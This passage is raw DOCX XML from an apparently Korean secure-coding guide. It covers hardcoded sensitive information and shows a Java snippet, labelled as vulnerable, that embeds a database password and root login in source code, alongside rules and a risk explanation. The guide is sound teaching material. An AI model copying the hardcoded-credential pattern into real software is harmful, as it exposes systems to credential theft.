              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">cookie.setHttpOnly(true);  // JS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>접근</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>차단</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  6. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>하드코드된</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>중요정보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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>패스워드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>암호화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키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등을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소스코드에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상수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>하드코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>형태로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포함하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>패스워드는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암호화하여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별도의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설정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파일에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저장하고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참조한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>소스코드에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>하드코딩</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String url = "jdbc:mysql://localhost/db";</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">String password = "admin1234";  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>소스코드에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>노출</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Connection con = DriverManager.getConnection(url, "root", password);</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>소스코드에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>하드코딩되면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> Git </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>저장소</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>열람</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있으면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>누구나</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>확인할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>퇴직자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외주</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>개발자도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이력에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>영구적으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조회</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능하며</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공개</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>저장소에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실수로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>업로드될</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>경우</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자동화</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>봇에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>의해</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>즉시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>환경변수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>또는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>암호화된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>설정파일에서</w:t>
            </w:r>
            <w:r>
